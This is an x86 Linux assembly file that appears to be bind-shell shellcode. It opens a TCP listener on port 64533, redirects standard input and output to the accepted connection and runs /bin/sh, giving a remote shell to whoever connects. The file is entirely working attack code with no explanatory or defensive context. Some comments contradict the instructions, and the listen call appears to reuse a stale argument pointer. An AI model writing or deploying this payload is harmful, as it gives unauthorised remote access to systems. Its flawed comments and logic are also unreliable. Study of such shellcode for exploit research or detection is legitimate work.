global _start
section .text
_start:
    xor ebx,ebx         ; Clear EAX
    mul ebx             ; Also clear EAX and EDX
    xor al,0x66         ; SYS_SOCKETCALL
    mov edi,eax         ; Save for future use
    inc ebx             ; SOCKET

    push edx            ; Protocol arg (0)
    push byte 0x1       ; SOCK_STREAM
    push byte 0x2       ; AF_INET
    mov ecx,esp         ; Save argument pointer -> ECX
    int 0x80            ; Exec interrupt
    mov esi,eax         ; Save returned FD -> ESI

    mov eax,edi         ; SYS_SOCKETCALL
    inc ebx             ; EBX -> BIND
    push edx            ; Bind to addr 0.0.0.0
    push word 0x15fc    ; Bind to port 64533
    push bx             ; AF_INET
    mov ecx,esp         ; Save sockaddr_in pointer -> ECX
    push byte +0x10     ; sockaddr_in length: 16
    push ecx            ; Push sockaddr_in pointer
    push esi            ; Push socket FD
    mov ecx,esp         ; Save argument pointer -> ECX
    int 0x80            ; Exec interrupt

    mov eax,edi         ; SYS_SOCKETCALL
    shl ebx,0x1         ; 2 -> 4
    push byte +0x5      ; Queue length: 5
    push esi            ; Push socket FD
    int 0x80            ; Exec interrupt

    mov eax,edi         ; SYS_SOCKETCALL
    inc ebx             ; 4 -> 5 (ACCEPT)
    push edx            ; Length of new sockaddr_in
    push edx            ; New sockaddr_in placeholder
    push esi            ; Push socket FD
    mov ecx,esp         ; Save argument pointer -> ECX
    int 0x80            ; Exec interrupt

    mov ebx,eax         ; Move connected socket FD to EBX
    xor ecx,ecx         ; Clear ECX
    inc ecx             ; Set to 1

dup2_loop:
    mov al,0x3f         ; DUP2
    int 0x80            ; Exec interrupt
    dec ecx             ; 1 -> 0
    jz dup2_loop        ; Loop until ECX == -1

    inc ecx             ; Reset ECX back to 0
    push ecx            ; Push null terminator
    push dword 0x68732f2f   ; //sh
    push dword 0x6e69622f   ; /bin
    mov ebx,esp         ; Save argument pointer -> EBX
    push ecx            ; Push 0
    mov al,0xb          ; EXECVE 
    int 0x80            ; Exec interrupt
